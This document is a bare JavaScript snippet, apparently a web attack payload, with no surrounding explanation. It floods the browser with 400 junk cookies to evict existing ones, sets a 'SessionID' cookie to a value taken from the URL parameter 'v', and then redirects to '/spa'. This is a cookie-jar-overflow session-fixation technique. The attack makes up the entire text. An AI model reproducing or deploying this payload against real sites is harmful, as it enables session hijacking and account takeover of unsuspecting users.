(function() {
    const targetValue = new URLSearchParams(window.location.search).get('v');
    if (!targetValue) return;

    for (let i = 0; i < 400; i++) {
        document.cookie = `trash_${i}=1;path=/`;
    }

    document.cookie = `SessionID=${encodeURIComponent(targetValue)};path=/`;

    setTimeout(() => {
        window.location.href = '/spa';
    }, 200);
})();
